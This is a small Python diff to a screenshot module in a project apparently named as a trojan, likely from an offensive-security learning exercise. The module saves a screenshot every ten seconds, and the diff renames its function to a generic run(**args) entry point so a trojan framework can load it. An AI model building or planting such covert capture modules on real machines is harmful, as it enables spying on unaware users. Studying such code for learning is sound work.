@@ -4,8 +4,9 @@ from datetime import datetime
 import os
 
 SCREENDIR = "/home/roman/VS/bhptrojan/modules/scrindir"
+interval = 10
 
-def take_screenshots(interval = 10):
+def run(**args):
     while True:
         timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
         file_name = os.path.join(SCREENDIR, f"screenshot_{timestamp}.png")
@@ -13,4 +14,4 @@ def take_screenshots(interval = 10):
         time.sleep(interval)
 
 if __name__ == "__main__":
-    take_screenshots()
+    run()
